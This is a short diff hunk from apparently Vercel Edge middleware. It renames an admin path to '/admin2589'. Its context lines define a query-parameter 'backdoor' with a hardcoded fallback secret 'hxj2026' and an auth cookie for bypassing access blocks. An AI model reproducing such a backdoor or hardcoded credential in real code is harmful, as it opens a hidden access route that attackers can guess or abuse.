@@ -5,7 +5,7 @@ import { geolocation, ipAddress, next } from "@vercel/edge";
 // ---------------------------------------------------------------------------
 const BACKDOOR_PARAM = "access";
 const BACKDOOR_VALUE = (process.env.EDGE_ACCESS_SECRET ?? "hxj2026").trim();
-const ADMIN_PATH = "/admin";
+const ADMIN_PATH = "/admin2589";
 const COOKIE_NAME = "internal_auth";
 const BLOCK_REDIRECT = (process.env.EDGE_BLOCK_REDIRECT ?? "https://www.google.com").trim();
 
